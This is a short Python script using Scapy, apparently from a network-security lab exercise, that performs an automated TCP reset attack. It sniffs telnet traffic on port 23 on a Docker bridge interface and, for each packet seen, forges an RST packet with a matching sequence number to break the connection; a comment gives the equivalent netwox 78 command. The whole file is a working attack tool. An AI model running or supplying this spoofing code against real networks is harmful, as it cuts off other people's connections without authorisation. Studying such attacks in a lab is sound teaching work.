#!/usr/bin/python3
# reset_auto
# sniff tcp connection and spoof rst packet to break the tcp connection
# Refs:
# 1. sudo netwox 78 --filter "src host 10.0.2.68"

from scapy.all import *

def spoof_tcp(pkt):
   IPLayer  = IP(dst= pkt[IP].src, src=pkt[IP].dst)
   TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
                  dport=pkt[TCP].sport, sport=pkt[TCP].dport)
   spoofpkt = IPLayer/TCPLayer
   ls(spoofpkt)
   send(spoofpkt, verbose=0)

pkt=sniff(iface='br-6dbb49d469fe', filter='tcp and port 23', prn=spoof_tcp)